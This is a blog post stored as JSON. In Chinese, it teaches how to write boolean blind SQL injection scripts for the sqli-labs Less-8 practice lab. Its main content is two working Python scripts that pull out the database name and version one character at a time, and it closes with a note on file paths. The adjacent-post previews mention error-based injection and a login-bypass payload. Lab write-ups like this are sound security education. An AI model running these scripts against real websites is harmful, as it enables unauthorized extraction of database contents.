{"title":"SQL注入其三","uid":"b489cff445cdd5efb0eecf16026a5aca","slug":"SQL注入其三","date":"2023-02-06T11:19:41.000Z","updated":"2023-02-06T11:35:13.553Z","comments":true,"path":"api/articles/SQL注入其三.json","keywords":null,"cover":[],"content":"<p>盲注脚本编写</p>\n<p>在长度未知的情况下，截取结果的某一位 “str” 与ascii码 [32, 128) 比较，如果所有可见字符都与<br>结果不匹配，则说明结果是空值，也就是已超出最大长度，此时停下脚本即可根据情况选择脚本正确判断的条件，比如某些字符出现时代表页面正常或根据页面返回长度判断</p>\n<p>例：对sqllab靶场第八关sqli-less8的当前数据库名进行爆破的盲注脚本</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import requests\n\ndef get_info(sql):\n    result,flag &#x3D; &quot;&quot;,True\n    for i in range(1,1000):\n        if(flag):\n            flag &#x3D; False\n            for j in range(32,128):\n                res &#x3D; requests.get(f&quot;http:&#x2F;&#x2F;www.sqli.com&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&#x3D;&#123;j&#125; -- + &quot;)\n                if(&quot;You are in&quot; in res.text):\n                    flag &#x3D; True\n                    result +&#x3D; chr(j)\n                    print(result)\n                    break\n        else:\n            print(f&quot;数据长度为&#123;i-2&#125;位，脚本运行结束&quot;)\n            break\n    return result\n\nget_info(&quot;select database()&quot;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>脚本运行结果：</p>\n<p><img src=\"/images/result.png\"></p>\n<p>有时因为网络环境因素，经常会遇到连接超时的情况，则可能需要用到超时重发</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import requests\n\nsession &#x3D; requests.Session()\na &#x3D; requests.adapters.HTTPAdapter(max_retries &#x3D; 3)\nb &#x3D; requests.adapters.HTTPAdapter(max_retries &#x3D; 3)\nsession.mount(&#39;http:&#x2F;&#x2F;&#39;,a)\nsession.mount(&#39;https:&#x2F;&#x2F;&#39;,b)\n\ndef get_info(sql):\n    result,flag &#x3D; &quot;&quot;,True\n    for i in range(1,1000):\n        if(flag):\n            flag &#x3D; False\n            for j in range(32,128):\n                try:\n                    res &#x3D; session.get(f&quot;http:&#x2F;&#x2F;www.sqli.com&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&#x3D;&#123;j&#125; -- +&quot;)\n                except Exception as e:\n                    exit(&quot;网络请求错误，程序退出&quot;)\n                \n                if(&quot;You are in&quot; in res.text):\n                    flag &#x3D; True\n                    result +&#x3D; chr(j)\n                    print(result)\n                    break\n        else:\n            print(f&quot;数据长度为&#123;i-2&#125;，脚本运行结束&quot;)\n            break\n    return result\n\nget_info(&quot;select version()&quot;)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>也可已通过使用二分法来提高查找效率</p>\n<p>脚本执行的结果可以通过os.path文件路径来保存到指定文件中</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import os\n# 当前文件绝对路径\nprint(os.path.abspath(__file__))\n# 当前文件所在目录\nprint(os.path.dirname(os.path.abspath(__file__)))<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","text":"盲注脚本编写 在长度未知的情况下，截取结果的某一位 “str” 与ascii码 [32, 128) 比较，如果所有可见字符都与结果不匹配，则说明结果是空值，也就是已超出最大长度，此时停下脚本即可根据情况选择脚本正确判断的条件，比如某些字符出现时代表页面正常或根据页面返回长度判断 ...","link":"","photos":[],"count_time":{"symbolsCount":"2.2k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"}],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"极客大挑战 2019-EasySQL1","uid":"688e9a26544b13828bb5688670613069","slug":"极客大挑战-2019-EasySQL1","date":"2023-02-06T11:37:11.000Z","updated":"2023-02-06T11:40:31.410Z","comments":true,"path":"api/articles/极客大挑战-2019-EasySQL1.json","keywords":null,"cover":[],"text":" 进入题目后发现有用户名和密码两个可输入项，明显与数据库有交互，进行SQL注入判断闭合符 报错信息为111’由此可知闭合符号为单引号’尝试使用万能密码1’ or ‘a’ &#x3D; ‘a’# 万能密码的原理：SQL语句中#后的语句全部被注释掉，输入1’保证闭合完整不报错，or是...","link":"","photos":[],"count_time":{"symbolsCount":214,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SQL注入其二","uid":"c35bf4cdcf9610d9342e4b2e541833f0","slug":"SQL注入其二","date":"2023-01-15T07:43:08.000Z","updated":"2023-01-15T07:55:54.688Z","comments":true,"path":"api/articles/SQL注入其二.json","keywords":null,"cover":null,"text":"1. 报错注入 mysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息，在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}